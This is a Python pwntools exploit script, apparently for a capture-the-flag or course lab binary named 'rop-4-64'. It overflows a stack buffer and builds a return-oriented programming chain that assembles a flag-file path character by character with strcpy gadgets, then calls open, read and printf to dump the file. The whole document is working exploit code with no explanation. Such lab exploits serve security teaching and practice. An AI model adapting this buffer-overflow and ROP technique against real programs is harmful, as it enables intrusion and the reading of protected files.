#!/usr/bin/env python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']
p = process("./rop-4-64")
#p = process("./rop-x")
#gdb.attach(p)
buf = "A" *0x80 + "BBBBBBBB"

rd = p64(0x4005b0)
opn = p64(0x4005d0)
pf = p64(0x4005a0)
strcpy = p64(0x4006e2)

slash = p64(0x400908)
fox = 0x400890
nums = 0x4008c0

pop_rdi = p64(0x400863)
pop_rsi_r15 = p64(0x400861)
pop_rdx_rbp = p64(0x40073f)

#/

buf += pop_rdi
buf += p64(0x601a00)
buf += pop_rsi_r15
buf += slash
buf += p64(0)
buf += strcpy

#h
buf += pop_rdi
buf += p64(0x601a01)
buf += pop_rsi_r15
buf += p64(fox+1)
buf += p64(0)
buf += strcpy

#o
buf += pop_rdi
buf += p64(0x601a02)
buf += pop_rsi_r15
buf += p64(fox+12)
buf += p64(0)
buf += strcpy

#m
buf += pop_rdi
buf += p64(0x601a03)
buf += pop_rsi_r15
buf += p64(fox+22)
buf += p64(0)
buf += strcpy

#e
buf += pop_rdi
buf += p64(0x601a04)
buf += pop_rsi_r15
buf += p64(fox+2)
buf += p64(0)
buf += strcpy

#/
buf += pop_rdi
buf += p64(0x601a05)
buf += pop_rsi_r15
buf += slash
buf += p64(0)
buf += strcpy

#l
buf += pop_rdi
buf += p64(0x601a06)
buf += pop_rsi_r15
buf += p64(fox+35)
buf += p64(0)
buf += strcpy

#a
buf += pop_rdi
buf += p64(0x601a07)
buf += pop_rsi_r15
buf += p64(fox+36)
buf += p64(0)
buf += strcpy

#b
buf += pop_rdi
buf += p64(0x601a08)
buf += pop_rsi_r15
buf += p64(fox+10)
buf += p64(0)
buf += strcpy

#s
buf += pop_rdi
buf += p64(0x601a09)
buf += pop_rsi_r15
buf += p64(fox+24)
buf += p64(0)
buf += strcpy

#/
buf += pop_rdi
buf += p64(0x601a0a)
buf += pop_rsi_r15
buf += slash
buf += p64(0)
buf += strcpy

#w
buf += pop_rdi
buf += p64(0x601a0b)
buf += pop_rsi_r15
buf += p64(fox+13)
buf += p64(0)
buf += strcpy

#e
buf += pop_rdi
buf += p64(0x601a0c)
buf += pop_rsi_r15
buf += p64(fox+2)
buf += p64(0)
buf += strcpy

#e
buf += pop_rdi
buf += p64(0x601a0d)
buf += pop_rsi_r15
buf += p64(fox+2)
buf += p64(0)
buf += strcpy

#k
buf += pop_rdi
buf += p64(0x601a0e)
buf += pop_rsi_r15
buf += p64(fox+8)
buf += p64(0)
buf += strcpy

#5
buf += pop_rdi
buf += p64(0x601a0f)
buf += pop_rsi_r15
buf += p64(nums+29)
buf += p64(0)
buf += strcpy

#/
buf += pop_rdi
buf += p64(0x601a10)
buf += pop_rsi_r15
buf += slash
buf += p64(0)
buf += strcpy

#r
buf += pop_rdi
buf += p64(0x601a11)
buf += pop_rsi_r15
buf += p64(fox+11)
buf += p64(0)
buf += strcpy

#o
buf += pop_rdi
buf += p64(0x601a12)
buf += pop_rsi_r15
buf += p64(fox+12)
buf += p64(0)
buf += strcpy

#p
buf += pop_rdi
buf += p64(0x601a13)
buf += pop_rsi_r15
buf += p64(fox+23)
buf += p64(0)
buf += strcpy

#-
buf += pop_rdi
buf += p64(0x601a14)
buf += pop_rsi_r15
buf += p64(nums+35)
buf += p64(0)
buf += strcpy

#4
buf += pop_rdi
buf += p64(0x601a15)
buf += pop_rsi_r15
buf += p64(nums+28)
buf += p64(0)
buf += strcpy

#-
buf += pop_rdi
buf += p64(0x601a16)
buf += pop_rsi_r15
buf += p64(nums+35)
buf += p64(0)
buf += strcpy

#6
buf += pop_rdi
buf += p64(0x601a17)
buf += pop_rsi_r15
buf += p64(nums+30)
buf += p64(0)
buf += strcpy

#4
buf += pop_rdi
buf += p64(0x601a18)
buf += pop_rsi_r15
buf += p64(nums+28)
buf += p64(0)
buf += strcpy

#/
buf += pop_rdi
buf += p64(0x601a19)
buf += pop_rsi_r15
buf += slash
buf += p64(0)
buf += strcpy

#f
buf += pop_rdi
buf += p64(0x601a1a)
buf += pop_rsi_r15
buf += p64(fox+16)
buf += p64(0)
buf += strcpy

#l
buf += pop_rdi
buf += p64(0x601a1b)
buf += pop_rsi_r15
buf += p64(fox+35)
buf += p64(0)
buf += strcpy

#a
buf += pop_rdi
buf += p64(0x601a1c)
buf += pop_rsi_r15
buf += p64(fox+36)
buf += p64(0)
buf += strcpy

#g
buf += pop_rdi
buf += p64(0x601a1d)
buf += pop_rsi_r15
buf += p64(fox+42)
buf += p64(0)
buf += strcpy

#\0
buf += pop_rdi
buf += p64(0x601a1e)
buf += pop_rsi_r15
buf += p64(fox+44)
buf += p64(0)
buf += strcpy


buf += pop_rdi
buf += p64(0x601a00)
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += pop_rdx_rbp
buf += p64(0)
buf += p64(0)
buf += opn


buf += pop_rdi
buf += p64(3)
buf += pop_rsi_r15
buf += p64(0x601a00)
buf += p64(0)
buf += pop_rdx_rbp
buf += p64(100)
buf += p64(0)
buf += rd

buf += pop_rdi
buf += p64(0x601a00)
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += pf

#print(len(buf))

p.send(buf)
p.interactive()
